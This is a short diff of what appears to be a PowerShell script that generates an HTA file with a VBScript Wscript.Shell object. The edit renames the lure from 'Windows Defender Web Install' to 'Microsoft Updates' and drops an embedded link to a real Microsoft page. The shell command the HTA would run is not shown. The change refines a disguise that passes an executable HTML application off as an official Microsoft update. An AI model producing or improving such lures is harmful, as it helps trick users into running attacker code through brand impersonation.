@@ -217,7 +217,7 @@ $HTA = @"
     <html xmlns="http://www.w3.org/1999/xhtml">
     <head>
     <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
-    <title>Windows Defender Web Install</title>
+    <title>Microsoft Updates</title>
 
     <script language="VBScript">
     set oShell = CreateObject("Wscript.Shell")
@@ -226,13 +226,12 @@ $HTA = @"
     </script>
     <hta:application
        id="oHTA"
-       applicationname="Windows Defender Web Install"
+       applicationname="Microsoft Updates"
        application="yes"
     >
     </hta:application>
     </head>
     <div> 
-    <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
     </object></div>   
     <body>
     </body>
